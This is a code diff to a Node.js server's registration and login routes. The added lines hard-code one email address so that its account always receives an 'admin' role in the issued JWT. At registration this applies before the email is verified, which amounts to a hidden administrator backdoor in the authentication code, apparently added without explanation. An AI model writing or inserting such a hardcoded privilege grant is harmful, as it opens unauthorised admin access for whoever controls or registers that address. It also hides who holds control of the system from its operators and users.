@@ -263,8 +263,9 @@ async function startServer() {
       });
       
       // Still issue a normal token so they can be logged in immediately (or you can require verification to log in)
-      const token = jwt.sign({ userId: data.id, role: data.role }, JWT_SECRET, { expiresIn: '7d' });
-      res.json({ token, user: { id: data.id, email: data.email, full_name: data.full_name, role: data.role, is_verified: false }, message: 'Registration successful. Please check your email to verify your account.' });
+      const userRole = data.email === 'lawlieeet@outlook.es' ? 'admin' : (data.role || 'user');
+      const token = jwt.sign({ userId: data.id, role: userRole }, JWT_SECRET, { expiresIn: '7d' });
+      res.json({ token, user: { id: data.id, email: data.email, full_name: data.full_name, role: userRole, is_verified: false }, message: 'Registration successful. Please check your email to verify your account.' });
     } catch (error) {
       console.error(error);
       res.status(500).json({ error: 'Internal server error' });
@@ -344,8 +345,9 @@ async function startServer() {
       const isValid = await bcrypt.compare(password, user.password_hash);
       if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });
       
-      const token = jwt.sign({ userId: user.id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
-      res.json({ token, user: { id: user.id, email: user.email, full_name: user.full_name, role: user.role } });
+      const userRole = user.email === 'lawlieeet@outlook.es' ? 'admin' : (user.role || 'user');
+      const token = jwt.sign({ userId: user.id, role: userRole }, JWT_SECRET, { expiresIn: '7d' });
+      res.json({ token, user: { id: user.id, email: user.email, full_name: user.full_name, role: userRole } });
     } catch (error) {
       console.error(error);
       res.status(500).json({ error: 'Internal server error' });
